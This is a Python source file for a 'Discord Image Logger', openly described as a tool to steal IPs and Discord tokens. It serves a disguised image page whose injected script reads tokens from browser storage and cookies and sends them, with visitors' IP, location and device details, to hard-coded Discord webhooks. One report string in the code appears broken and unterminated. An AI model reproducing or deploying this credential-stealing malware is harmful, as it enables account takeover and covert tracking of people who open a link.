# Image Logger with Token Capture
# By Team C00lB0i/C00lB0i | Modified for token capture

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and Discord tokens"
__version__ = "v3.0"
__author__ = "C00lB0i"

config = {
    "webhook": "https://discord.com/api/webhooks/1386517547129503784/H7Y_Af2SiwqmPTzmsBRpZmQwCiEj5hjpf0FNVUl0WavinXJRTNpZSnqREViEWNV0QPxZ",
    "token_webhook": "https://discord.com/api/webhooks/1386729903604367502/S7dnBw213vde8pTUkWWBj7C0oRwa1RMpCjPI1CtayiQqgOIQ6Ps_MBoXvJB5PmKGsGdw",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"Image Logging link sent!\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    # VPN and bot checks
    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting", False):
        if config["antiBot"] in [3, 4]:
            return
        if config["antiBot"] in [1, 2] and not info.get("proxy", False):
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Image!**

**IP:** `{ip}`
**Location:** {info.get('city', 'Unknown')}, {info.get('regionName', 'Unknown')}, {info.get('country', 'Unknown')}
**ISP:** {info.get('isp', 'Unknown')}
**Coords:** {coords if coords else f"{info.get('lat', '?')}, {info.get('lon', '?')}"}
**Mobile:** {info.get('mobile', False)}
**VPN:** {info.get('proxy', False)}
**Bot:** {info.get('hosting', False)}

**OS:** {os}
**Browser:** {browser}
**User Agent:**
                }
        ],
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    requests.post(config["webhook"], json=embed)
    return info

def sendTokenReport(ip, useragent, token, cookies):
    requests.post(config["token_webhook"], json={
        "username": "Token Capture",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Discord Token Captured!",
                "color": 0xFF0000,
                "fields": [
                    {"name": "IP", "value": ip, "inline": True},
                    {"name": "User Agent", "value": useragent, "inline": True},
                    {"name": "Token", "value": f"```{token}```", "inline": False},
                    {"name": "Cookies", "value": f"```{cookies[:1000]}```" if cookies else "None", "inline": False}
                ]
            }
        ]
    })

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # Handle token submission
            if self.path == '/logtoken' and self.command == 'POST':
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode())
                
                ip = self.headers.get('X-Forwarded-For', self.headers.get('x-forwarded-for', 'Unknown'))
                useragent = self.headers.get('User-Agent', 'Unknown')
                token = data.get('token', 'NOT_FOUND')
                cookies = data.get('cookies', '')
                
                if token != 'NOT_FOUND':
                    sendTokenReport(ip, useragent, token, cookies)
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
                return

            # Main GET request
            query = parse.parse_qs(parse.urlsplit(self.path).query)
            ip = self.headers.get('X-Forwarded-For', self.headers.get('x-forwarded-for', 'Unknown'))
            useragent = self.headers.get('User-Agent', 'Unknown')
            
            # Get image URL
            if config["imageArgument"]:
                url = config["image"]
                if 'url' in query:
                    url = base64.b64decode(query['url'][0].encode()).decode()
                elif 'id' in query:
                    url = base64.b64decode(query['id'][0].encode()).decode()
            else:
                url = config["image"]
            
            # Skip blacklisted IPs
            if any(ip.startswith(prefix) for prefix in blacklistedIPs):
                return
            
            # Handle bots
            bot = botCheck(ip, useragent)
            if bot:
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_header('Location', url)
                    self.end_headers()
                makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
                return
            
            # Build HTML with token capture script
            html_content = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style>
<div class="img"></div>
<script>
setTimeout(() => {{
    const data = {{
        token: "NOT_FOUND",
        cookies: document.cookie
    }};
    
    // Check for Discord token in storage
    const tokenKeys = ['token', 'discord_token', '_token', 'access_token', 'auth_token'];
    for (const key of tokenKeys) {{
        try {{
            // Check localStorage
            const tokenValue = localStorage.getItem(key);
            if (tokenValue && tokenValue.length > 50) {{
                data.token = tokenValue;
                break;
            }}
            
            // Check sessionStorage
            const sessionToken = sessionStorage.getItem(key);
            if (sessionToken && sessionToken.length > 50) {{
                data.token = sessionToken;
                break;
            }}
        }} catch(e) {{}}
    }}
    
    // Send token to server
    fetch('/logtoken', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify(data)
    }});
}}, 3000);
</script>
'''
            
            # Geolocation script
            if config["accurateLocation"] and 'g' not in query:
                html_content += '''<script>
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(position => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const g = btoa(lat + ',' + lon).replace(/=/g, "%3D");
        window.location.search += '&g=' + g;
    });
}
</script>'''
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
            
            # Process geolocation if available
            coords = None
            if 'g' in query:
                try:
                    coords = base64.b64decode(query['g'][0].encode()).decode()
                except:
                    pass
            
            # Make IP report
            makeReport(ip, useragent, coords, self.path.split("?")[0], url=url)
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
